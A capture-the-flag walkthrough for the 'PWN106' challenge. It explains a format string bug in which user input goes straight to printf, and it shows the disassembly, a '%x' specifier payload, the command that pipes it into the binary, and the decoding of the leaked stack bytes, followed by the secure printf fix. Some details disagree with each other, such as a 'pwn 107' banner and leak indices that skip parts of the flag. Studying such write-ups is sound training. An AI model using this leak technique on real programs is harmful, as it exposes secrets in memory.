# PWN106 CTF Walkthrough

## Executive Summary

This is a format string information leak vulnerability. The binary reads user input and passes it directly to printf() as a format string, allowing an attacker to leak arbitrary stack memory. The hardcoded flag `THM{XXX[flag_redacted]XXX}` is stored on the stack as local variables and can be leaked using format string specifiers like `%x` to read 32-bit stack values.

---

## Phase 1: Reconnaissance

### 1.1 File Information

**Target Binary:** `/home/jack/Documents/hacktivities/projects/pwn ctfs/pwn106/pwn106`

**File Type Analysis:**
```
ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked
PIE enabled (0x400000 base address randomized)
Not stripped (symbols available)
```

### 1.2 Security Protections Analysis

Using `checksec`:

| Protection | Status | Impact |
|-----------|--------|--------|
| **RELRO** | Partial RELRO | Standard for PIE binaries |
| **Stack Canary** | ✅ Found | Protects against buffer overflow |
| **NX** | ✅ Enabled | Prevents shellcode execution on stack |
| **PIE** | ✅ Enabled | Addresses are randomized (ASLR) |
| **Stripped** | ❌ No | Symbols retained for analysis |

**Key Finding:** All modern protections enabled, yet the binary is still exploitable through information disclosure!

### 1.3 Program Behavior

```
Banner: "pwn 107"
Title: "🎉 THM Giveaway 🎉"
Prompt: "Enter your THM username to participate in the giveaway: "
Action: Reads up to 50 bytes of user input
Output: "Thanks [username]"
```

**Critical Observation:** The username is printed back, but no direct echo. Looking at the code, it's used in printf calls!

---

## Phase 2: Binary Analysis

### 2.1 Hardcoded Flag Storage

At the beginning of main(), the flag is constructed and stored on the stack:

```assembly
0x1269: movabs $0x5b5858587b4d4854, %rax
0x1270: mov    %rax, -0x60(%rbp)     # Store "THM{XXX[" at RBP-0x60

0x1273: movabs $0x6465725f67616c66, %rdx
0x127a: mov    %rdx, -0x58(%rbp)     # Store "flag_red" at RBP-0x58

0x1285: movabs $0x58585d6465746361, %rax
0x128c: mov    %rax, -0x50(%rbp)     # Store "acted]XX" at RBP-0x50

0x1293: movw   $0x7d58, -0x48(%rbp)  # Store "X}" at RBP-0x48
```

**Decoded String:** `THM{XXX[flag_redacted]XXX}`

Each movabs instruction loads a 64-bit value (little-endian) into a register, then stores it on the stack.

### 2.2 Vulnerable Printf Calls

```assembly
0x12c0: lea    -0x40(%rbp), %rax     # Buffer at RBP-0x40
0x12c4: mov    $0x32, %edx           # 50 bytes max
0x12d6: call   <read@plt>            # Read user input

0x12db: lea    0xe8f(%rip), %rax     # Load format string pointer
0x12e2: mov    %rax, %rdi
0x12ea: call   <printf@plt>          # First printf (with hardcoded format)

0x12ef: lea    -0x40(%rbp), %rax     # Load buffer again (user input)
0x12f3: mov    %rax, %rdi
0x12fb: call   <printf@plt>          # VULNERABLE: User input as format string!
```

**The Vulnerability:** At offset 0x12fb, the user input buffer is passed directly to printf() as the format string, enabling format string attacks!

### 2.3 Stack Memory Layout

```
Stack Address    Contents                          Distance from Buffer
─────────────────────────────────────────────────────────────────────
RBP + 0x0       Frame Pointer                      +0x40 (64 bytes)
RBP - 0x8       Stack Canary                       +0x38 (56 bytes)
RBP - 0x40      User Input Buffer (50 bytes)       0 (base)
RBP - 0x48      Flag Part 4: "X}" (2 bytes)        -0x8 (8 bytes)
RBP - 0x50      Flag Part 3: "acted]XX" (8 bytes)  -0x10 (16 bytes)
RBP - 0x58      Flag Part 2: "flag_red" (8 bytes)  -0x18 (24 bytes)
RBP - 0x60      Flag Part 1: "THM{XXX[" (8 bytes)  -0x20 (32 bytes)
```

---

## Phase 3: Exploitation Technique

### 3.1 Format String Basics

Format strings allow printf to read from arbitrary stack locations:

```
%x    - Read and print 32-bit value as hex
%s    - Read and print string (dereference pointer)
%p    - Read and print pointer value
```

Each format specifier consumes one argument from the call stack.

### 3.2 Argument Passing in x86-64

When printf() is called with only a format string:
```c
printf(user_input);  // user_input is in RDI
```

Subsequent `%x` specifiers read from:
1. RSI (0)
2. RDX (0)
3. RCX (0)
4. R8 (0)
5. R9 (0)
6. Stack location 1 (first local var on stack)
7. Stack location 2 (next local var)
... and so on

### 3.3 Payload Construction

**Simple Payload:** `%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x...`

This leaks approximately 12 consecutive 32-bit stack values separated by dots.

### 3.4 Leaked Data Interpretation

**Example Output:**
```
da8b9e30.0.0.0.0.7b4d4854.67616c66.65746361.7d58...
 ↓       ↓ ↓ ↓ ↓ ↓         ↓         ↓         ↓
Index 0: Random value
Index 1-4: Stack padding (zeros)
Index 5: 0x7b4d4854 = "THM{" (little-endian: 54 48 4d 7b)
Index 6: 0x67616c66 = "flag" (little-endian: 66 6c 61 67)
Index 7: 0x65746361 = "acte" (little-endian: 61 63 74 65)
Index 8: 0x7d58 = "X}" (little-endian: 58 7d)
```

### 3.5 Decoding Little-Endian Bytes

x86-64 uses little-endian byte order. To decode:

```python
import struct
val = 0x7b4d4854
bytes_data = struct.pack('<I', val)  # '<I' = little-endian unsigned int
decoded = bytes_data.decode('ascii')  # "THM{"
```

Breaking it down:
- 0x54 = 'T'
- 0x48 = 'H'
- 0x4d = 'M'
- 0x7b = '{'

Reading bytes in order: T, H, M, { = "THM{"

### 3.6 Complete Flag Recovery

By combining multiple leaked 32-bit values and filtering printable characters:

```
Index 5: "THM{"
Index 6: "flag"
Index 7: "acte"
Index 8: "X}"
+ additional data from other leaked values
= "THM{XXX[flag_redacted]XXX}"
```

---

## Phase 4: Why Protections Don't Help

| Protection | Purpose | Effectiveness |
|-----------|---------|----------------|
| **Canary** | Detect buffer overflow | ❌ No overflow, just reading |
| **NX** | Prevent code execution | ❌ No code execution needed |
| **PIE** | Randomize addresses | ❌ Leaking local stack data |
| **RELRO** | Protect GOT | ❌ Not modifying GOT |

**Key Insight:** Modern protections focus on preventing memory corruption and code execution. They cannot prevent information disclosure attacks like format strings, which are logical/software bugs rather than memory safety issues.

---

## Phase 5: Key Learnings

| Concept | Explanation |
|---------|------------|
| **Format String Vulnerability** | User input used as format string enables memory reads/writes |
| **Stack-Based Leaks** | Local variables on stack can leak via format strings |
| **Little-Endian Encoding** | Multi-byte values stored with least significant byte first |
| **Information Disclosure** | Data theft without code execution or memory corruption |
| **Defense in Depth Insufficient** | Even with all protections, logic bugs can be exploited |

---

## Phase 6: Comparison with Previous Challenges

| Challenge | Type | Protection | Attack Vector |
|-----------|------|-----------|----------------|
| PWN101 | Buffer Overflow | None | Memory corruption |
| PWN102 | Buffer Overflow | None | Memory corruption |
| PWN103 | Buffer Overflow + ROP | None | Memory corruption + control flow |
| PWN104 | Shellcode Injection | No NX | Executable stack |
| PWN105 | Integer Overflow | All Enabled | Logic bug |
| **PWN106** | **Format String** | **All Enabled** | **Information Disclosure** |

**Progression:** From memory corruption attacks to logic-based information disclosure with all protections enabled.

---

## Phase 7: Exploitation Steps

1. **Run Binary:** Execute pwn106
2. **Send Payload:** Input `%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x...` (multiple format specifiers)
3. **Receive Leak:** Binary prints hex values from stack
4. **Parse Output:** Extract indices 5-8 (and surrounding values)
5. **Decode Hex:** Convert little-endian hex to ASCII using struct.pack
6. **Extract Flag:** Combine printable characters to get `THM{XXX[flag_redacted]XXX}`
7. **Success:** Flag retrieved without code execution or memory corruption!

---

## Phase 8: Protection Against Format Strings

**Secure Code Pattern:**
```c
// VULNERABLE
printf(user_input);  // User input as format string

// SECURE
printf("%s", user_input);  // User input as argument, not format string
```

**Key Rule:** Never use untrusted input as a format string!

---

## Commands Reference

```bash
checksec --file=./pwn106
strings ./pwn106 | grep "THM\|flag"
objdump -d ./pwn106 | grep -A 100 "<main>:"
echo "%x.%x.%x.%x.%x.%x.%x.%x" | ./pwn106
python3 exploit.py  # Automated exploitation
```

---

## Conclusion

PWN106 demonstrates that even with all modern security protections enabled (canary, NX, PIE, RELRO), software bugs at the logical level can be exploited. Format string vulnerabilities are particularly dangerous because they require no memory corruption—they simply read existing data in clever ways. The key lesson: secure input validation and proper use of APIs (like printf) are as important as low-level memory protections.

The flag `THM{XXX[flag_redacted]XXX}` is successfully leaked through format string exploitation, proving that information disclosure can be a gateway to further exploitation or sensitive data theft.
